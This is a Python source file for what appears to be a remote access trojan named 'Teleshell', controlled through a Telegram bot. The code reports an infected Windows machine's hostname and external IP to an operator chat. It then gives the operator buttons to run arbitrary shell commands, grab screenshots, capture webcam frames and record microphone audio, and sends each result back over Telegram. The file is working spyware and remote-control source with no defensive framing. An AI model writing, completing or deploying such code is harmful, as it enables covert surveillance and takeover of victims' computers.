import telebot
import subprocess
import socket
import requests
from telebot import types
import time
import os
import mss
from PIL import Image
import cv2
import sounddevice as sd
import wave

TOKEN = "bot-token"
bot = telebot.TeleBot(TOKEN)
ADMIN_CHAT_ID = "chat-id"
clients = {}
connected_clients = set()
MAX_MESSAGE_LENGTH = 4096

def get_temp_folder():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Temp')

def get_external_ip():
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        return ip_data['ip']

def get_client_info():
    username = socket.gethostname()
    external_ip = get_external_ip()
    return username, external_ip

def add_client():
    username, ip_address = get_client_info()
    if ip_address and ip_address not in clients:
        clients[ip_address] = username
        connected_clients.add(ip_address)
        bot.send_message(ADMIN_CHAT_ID, f"Connected: {username} ({ip_address})")

def remove_client(ip_address):
    if ip_address in clients:
        bot.send_message(ADMIN_CHAT_ID, f"Disconnected: {clients[ip_address]} ({ip_address})")
        del clients[ip_address]
        connected_clients.discard(ip_address)

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, "Welcome to Teleshell")

@bot.message_handler(commands=['clients'])
def clients_message(message):
    if not clients:
        bot.send_message(message.chat.id, "No Clients.")
        return
    markup = types.InlineKeyboardMarkup()
    for ip, username in clients.items():
        markup.add(types.InlineKeyboardButton(f"{username} ({ip})", callback_data=f"pc_{ip}"))
    bot.send_message(message.chat.id, "Clients connected:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data.startswith("pc_"):
        ip = call.data.split('_')[1]
        markup = types.InlineKeyboardMarkup()
        button_shell = types.InlineKeyboardButton("Shell", callback_data=f"shell_{ip}")
        button_screenshot = types.InlineKeyboardButton("Screenshot", callback_data=f"screenshot_{ip}")
        button_webcam = types.InlineKeyboardButton("Webcam", callback_data=f"webcam_{ip}")
        button_record_audio = types.InlineKeyboardButton("Record Audio", callback_data=f"recordaudio_{ip}")
        markup.add(button_shell, button_screenshot, button_webcam, button_record_audio)
        bot.send_message(call.message.chat.id, f"Select task for: {clients[ip]} ({ip}):", reply_markup=markup)
    elif call.data.startswith("shell_"):
        ip = call.data.split('_')[1]
        bot.send_message(call.message.chat.id, f"Shell command on {clients[ip]} ({ip}):")
        bot.register_next_step_handler(call.message, execute_command, ip)
    elif call.data.startswith("screenshot_"):
        ip = call.data.split('_')[1]
        send_screenshot(call.message, ip)
    elif call.data.startswith("webcam_"):
        ip = call.data.split('_')[1]
        send_webcam_image(call.message, ip)
    elif call.data.startswith("recordaudio_"):
        ip = call.data.split('_')[1]
        bot.send_message(call.message.chat.id, f"How many seconds to record audio for {clients[ip]} ({ip})?")
        bot.register_next_step_handler(call.message, record_audio, ip)

def execute_command(message, ip):
    command = message.text
    try:
        result = subprocess.check_output(command, shell=True, universal_newlines=True)
        send_long_message(message.chat.id, f"{clients[ip]} ({ip}) output:\n{result}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Command error:\n{e}")

def send_long_message(chat_id, message):
    if len(message) <= MAX_MESSAGE_LENGTH:
        bot.send_message(chat_id, message)
    else:
        for i in range(0, len(message), MAX_MESSAGE_LENGTH):
            bot.send_message(chat_id, message[i:i + MAX_MESSAGE_LENGTH])

def send_screenshot(message, ip):
    try:
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[1])
            img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
            temp_folder = get_temp_folder()
            screenshot_path = os.path.join(temp_folder, f"screenshot_{ip}.png")
            img.save(screenshot_path)
        with open(screenshot_path, "rb") as img_file:
            bot.send_photo(message.chat.id, img_file)
            bot.send_message(message.chat.id, f"Screenshot from: {clients[ip]} ({ip})")
        os.remove(screenshot_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Screenshot error: {e}")

def send_webcam_image(message, ip):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            temp_folder = get_temp_folder()
            webcam_image_path = os.path.join(temp_folder, f"webcam_{ip}.png")
            cv2.imwrite(webcam_image_path, frame)
            with open(webcam_image_path, "rb") as img_file:
                bot.send_photo(message.chat.id, img_file)
            os.remove(webcam_image_path)
        cap.release()
    except Exception as e:
        bot.send_message(message.chat.id, f"Webcam error: {e}")

def record_audio(message, ip):
    try:
        duration = int(message.text)
        temp_folder = get_temp_folder()
        audio_path = os.path.join(temp_folder, f"audio_{ip}.wav")
        
        fs = 44100  
        seconds = duration 
        bot.send_message(message.chat.id, f"Recording audio for {seconds} seconds...")
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait() 
        
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(2) 
            wf.setsampwidth(2)  
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        
        with open(audio_path, "rb") as audio_file:
            bot.send_audio(message.chat.id, audio_file)
        
        os.remove(audio_path)
    except Exception as e:
        bot.send_message(message.chat.id, f"Recording error: {e}")

def monitor_clients():
    while True:
        username, ip_address = get_client_info()
        if ip_address and ip_address not in connected_clients:
            add_client()
        time.sleep(300)

import threading

def start_polling():
    bot.polling()

monitoring_thread = threading.Thread(target=monitor_clients)
monitoring_thread.start()

start_polling()
